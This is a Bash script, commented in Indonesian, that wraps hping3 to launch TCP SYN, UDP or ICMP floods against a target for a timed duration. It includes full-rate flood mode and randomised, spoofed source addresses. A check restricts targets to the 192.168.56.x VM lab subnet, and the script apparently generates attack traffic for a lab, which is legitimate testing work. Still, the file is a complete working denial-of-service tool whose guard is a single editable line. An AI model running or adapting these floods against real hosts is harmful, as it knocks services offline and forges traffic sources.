#!/usr/bin/env bash
# attacker-hping3.sh — Hping3-style transport-layer flood (TCP SYN / UDP / ICMP)
# VM lab only. Hanya subnet 192.168.56.x diizinkan.
set -Eeuo pipefail

TARGET_IP="${TARGET_IP:-192.168.56.103}"
ATTACK_MODE="${ATTACK_MODE:-tcp_syn_flood}"   # tcp_syn_flood | udp_flood | icmp_flood
DURATION="${DURATION:-60}"
PORTS="${PORTS:-80}"
HPING3_FLOOD="${HPING3_FLOOD:-1}"
HPING3_COUNT="${HPING3_COUNT:-3000}"
HPING3_INTERVAL="${HPING3_INTERVAL:-u1000}"
HPING3_RAND_SOURCE="${HPING3_RAND_SOURCE:-1}"
HPING3_QUIET="${HPING3_QUIET:-0}"
HPING3_BIN=""

log() {
  printf '[hping3] %s\n' "$*"
}

die() {
  printf '[hping3][ERROR] %s\n' "$*" >&2
  exit 1
}

validate_lab_ip() {
  case "$1" in
    192.168.56.*) ;;
    10.*|172.*|127.*|169.254.*|0.*|255.*) die "IP '$1' bukan subnet lab 192.168.56.x. Script dihentikan." ;;
    *.*.*.*) die "IP '$1' tidak diizinkan. Gunakan subnet VM lokal 192.168.56.x saja." ;;
    *) die "IP '$1' tidak valid." ;;
  esac
}

run_tcp_syn_flood() {
  log "Hping3 TCP SYN flood: duration=${DURATION}s port=$PORTS target=$TARGET_IP"
  if [[ "$HPING3_FLOOD" == "1" ]]; then
    run_hping3_with_timeout "${HPING3_OUTPUT_ARGS[@]}" --syn --flood "${HPING3_SOURCE_ARGS[@]}" -p "$PORTS" "$TARGET_IP"
  else
    run_hping3_with_timeout "${HPING3_OUTPUT_ARGS[@]}" --syn "${HPING3_SOURCE_ARGS[@]}" -c "$HPING3_COUNT" -i "$HPING3_INTERVAL" -p "$PORTS" "$TARGET_IP"
  fi
}

run_udp_flood() {
  log "Hping3 UDP flood: duration=${DURATION}s port=$PORTS target=$TARGET_IP"
  if [[ "$HPING3_FLOOD" == "1" ]]; then
    run_hping3_with_timeout "${HPING3_OUTPUT_ARGS[@]}" --udp --flood "${HPING3_SOURCE_ARGS[@]}" -p "$PORTS" "$TARGET_IP"
  else
    run_hping3_with_timeout "${HPING3_OUTPUT_ARGS[@]}" --udp "${HPING3_SOURCE_ARGS[@]}" -c "$HPING3_COUNT" -i "$HPING3_INTERVAL" -p "$PORTS" "$TARGET_IP"
  fi
}

run_icmp_flood() {
  log "Hping3 ICMP flood: duration=${DURATION}s target=$TARGET_IP"
  if [[ "$HPING3_FLOOD" == "1" ]]; then
    run_hping3_with_timeout "${HPING3_OUTPUT_ARGS[@]}" --icmp --flood "${HPING3_SOURCE_ARGS[@]}" "$TARGET_IP"
  else
    run_hping3_with_timeout "${HPING3_OUTPUT_ARGS[@]}" --icmp "${HPING3_SOURCE_ARGS[@]}" -c "$HPING3_COUNT" -i "$HPING3_INTERVAL" "$TARGET_IP"
  fi
}

run_hping3_with_timeout() {
  local output_file
  output_file="$(mktemp)"

  set +e
  timeout "${DURATION}s" sudo -n "$HPING3_BIN" "$@" 2>&1 | tee "$output_file"
  local status=$?
  set -e

  # timeout returns 124 when it stops the flood after DURATION seconds.
  case "$status" in
    0)
      ;;
    1)
      if grep -Eqi 'sudo:|not in sudoers|password|operation not permitted|permission denied' "$output_file"; then
        rm -f "$output_file"
        die "sudo hping3 gagal non-interactive. Jalankan scripts/vm-lab/setup-remote-lab-sudo.sh untuk user attacker."
      elif grep -q 'packets transmitted' "$output_file"; then
        log "hping3 selesai dengan exit code 1 karena tidak ada balasan paket. Ini normal untuk SYN/UDP/ICMP lab."
      else
        log "hping3 selesai dengan exit code 1. Tidak ada error sudo terdeteksi; lanjut sebagai hasil traffic lab."
      fi
      ;;
    124)
      log "hping3 dihentikan oleh timeout setelah ${DURATION}s."
      ;;
    *)
      rm -f "$output_file"
      die "hping3 gagal dengan exit code $status."
      ;;
  esac

  rm -f "$output_file"
}

main() {
  validate_lab_ip "$TARGET_IP"
  HPING3_BIN="$(command -v hping3 || true)"
  [[ -n "$HPING3_BIN" ]] || die "Install dulu: sudo apt install -y hping3"

  log "Mulai Hping3 attack mode=$ATTACK_MODE duration=${DURATION}s target=$TARGET_IP"
  if [[ "$HPING3_FLOOD" == "1" ]]; then
    log "Mode packet: flood"
  else
    log "Mode packet: rate-limited count=${HPING3_COUNT} interval=${HPING3_INTERVAL}"
  fi
  HPING3_SOURCE_ARGS=()
  if [[ "$HPING3_RAND_SOURCE" == "1" ]]; then
    HPING3_SOURCE_ARGS=(--rand-source)
    log "Source IP mode: random"
  else
    log "Source IP mode: fixed attacker IP"
  fi
  HPING3_OUTPUT_ARGS=()
  if [[ "$HPING3_QUIET" == "1" ]]; then
    HPING3_OUTPUT_ARGS=(-q)
    log "Output mode: quiet"
  fi

  case "$ATTACK_MODE" in
    tcp_syn_flood) run_tcp_syn_flood ;;
    udp_flood)     run_udp_flood ;;
    icmp_flood)    run_icmp_flood ;;
    *) die "ATTACK_MODE tidak dikenal: $ATTACK_MODE. Pilih: tcp_syn_flood, udp_flood, icmp_flood" ;;
  esac

  log "Selesai: Hping3 $ATTACK_MODE"
}

main "$@"
